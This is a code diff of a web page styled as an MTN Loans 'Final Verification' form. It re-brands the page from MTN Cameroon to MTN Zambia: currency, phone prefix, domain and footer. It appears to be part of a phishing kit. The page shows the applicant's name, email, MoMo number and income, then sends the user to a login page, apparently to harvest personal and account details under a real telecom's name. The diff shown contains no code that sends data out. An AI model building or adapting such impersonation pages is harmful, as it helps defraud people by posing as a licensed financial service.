@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN  | Final Verification – mtn.cm</title>
+    <title>MTN Loans | Final Verification – mtn.co.zm</title>
     <meta name="theme-color" content="#FFCC00">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
@@ -13,7 +13,8 @@
             box-sizing: border-box;
         }
 
-        html, body {
+        html,
+        body {
             height: 100%;
             font-family: 'Inter', sans-serif;
             background: #fef9e6;
@@ -68,8 +69,9 @@
             line-height: 1.2;
         }
 
-        .logo- {
+        .logo-loans {
             color: #1a1a1a;
+            margin-left: 4px;
         }
 
         .card {
@@ -274,7 +276,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         #successOverlay {
@@ -383,7 +387,8 @@
             .btn-group {
                 gap: 10px;
             }
-            .prev-btn, .submit-btn {
+            .prev-btn,
+            .submit-btn {
                 padding: 12px;
                 font-size: 15px;
             }
@@ -397,7 +402,10 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-"> </span></div>
+        <div class="logo">
+            <span class="logo-mtn">MTN</span>
+            <span class="logo-loans">Loans</span>
+        </div>
     </header>
     <main class="card">
         <div class="top">
@@ -413,9 +421,9 @@
                 <option>Unemployed</option>
                 <option>Student</option>
             </select>
-            <label class="form-label">Estimated Annual Income (XAF)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="e.g. 2,000,000" inputmode="numeric">
-            <div class="error-message" id="errIncome">Please enter a valid annual income (minimum 2,000 XAF recommended).</div>
+            <label class="form-label">Estimated Annual Income (ZMW)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="e.g. 60,000" inputmode="numeric">
+            <div class="error-message" id="errIncome">Please enter a valid annual income (minimum 200 ZMW recommended).</div>
             <div class="summary-box" id="summaryBox"></div>
             <div class="global-feedback" id="globalFeedback">
                 Please review the information above and fill in the required field to submit.
@@ -426,7 +434,7 @@
             <button class="submit-btn" id="submitBtn">Submit Application</button>
         </div>
     </main>
-    <footer>© 2026 MTN Cameroon – Licensed mobile financial services | Powered by MTN Mobile Money (MoMo) | Terms apply</footer>
+    <footer>© 2026 MTN Zambia – Licensed mobile financial services | Powered by MTN Mobile Money (MoMo) | Terms apply</footer>
 
     <div id="spinnerOverlay">
         <div class="spinner"></div>
@@ -437,14 +445,14 @@
             <div class="check-icon">✓</div>
             <div class="success-title">Application Submitted</div>
             <div class="success-msg">
-                Your MTN  credit application has been submitted successfully.<br><br>
+                Your MTN Loans credit application has been submitted successfully.<br><br>
                 You will be contacted shortly for verification. A confirmation will be sent to your MTN MoMo number and email address.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirecting to MTN  portal in <span id="countdown">3</span>…
+                Redirecting to MTN Loans portal in <span id="countdown">3</span>…
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to MTN </button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to MTN Loans</button>
         </div>
     </div>
 
@@ -455,23 +463,25 @@
         const formattedAmount = parseFloat(loanAmount).toLocaleString('en-US');
         const termDays = localStorage.getItem('loanTerm') || '30';
 
-        let loanTypeDisplay = localStorage.getItem('loanType') || 'MTN ';
-        if (!loanTypeDisplay.includes('MTN')) loanTypeDisplay = 'MTN ';
+        let loanTypeDisplay = localStorage.getItem('loanType') || 'MTN Loans';
+        if (!loanTypeDisplay.includes('MTN')) loanTypeDisplay = 'MTN Loans';
 
         let phone = localStorage.getItem('phone') || 'N/A';
         if (phone !== 'N/A' && phone.length === 9) {
-            phone = '+237 ' + phone.substring(0,1) + ' ' + phone.substring(1,3) + ' ' + phone.substring(3,5) + ' ' + phone.substring(5,7) + ' ' + phone.substring(7,9);
+            // Format as +260 7X XXX XXX
+            phone = '+260 ' + phone.substring(0, 1) + ' ' + phone.substring(1, 3) + ' ' + phone.substring(3, 5) + ' ' + phone
+                .substring(5, 7) + ' ' + phone.substring(7, 9);
         }
 
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Credit product:</span><span class="summary-value">${loanTypeDisplay}</span></div>
-            <div class="summary-row"><span>Amount requested:</span><span class="summary-value">XAF ${formattedAmount}</span></div>
-            <div class="summary-row"><span>Duration:</span><span class="summary-value">${termDays} days</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'General expenses'}</span></div>
-            <div class="summary-row"><span>Applicant:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>MTN MoMo Number:</span><span class="summary-value">${phone}</span></div>
-        `;
+                <div class="summary-row"><span>Credit product:</span><span class="summary-value">${loanTypeDisplay}</span></div>
+                <div class="summary-row"><span>Amount requested:</span><span class="summary-value">ZMW ${formattedAmount}</span></div>
+                <div class="summary-row"><span>Duration:</span><span class="summary-value">${termDays} days</span></div>
+                <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'General expenses'}</span></div>
+                <div class="summary-row"><span>Applicant:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+                <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
+                <div class="summary-row"><span>MTN MoMo Number:</span><span class="summary-value">${phone}</span></div>
+            `;
 
         // Pre-fill fields if they exist
         if (localStorage.getItem('employmentStatus')) {
@@ -487,7 +497,7 @@
             document.getElementById('errIncome').classList.remove('error-visible');
             document.getElementById('globalFeedback').style.display = 'none';
             let isValid = true;
-            if (!income || Number(income) < 2000) {
+            if (!income || Number(income) < 200) {
                 document.getElementById('annualIncome').classList.add('invalid');
                 document.getElementById('errIncome').classList.add('error-visible');
                 document.getElementById('globalFeedback').style.display = 'block';
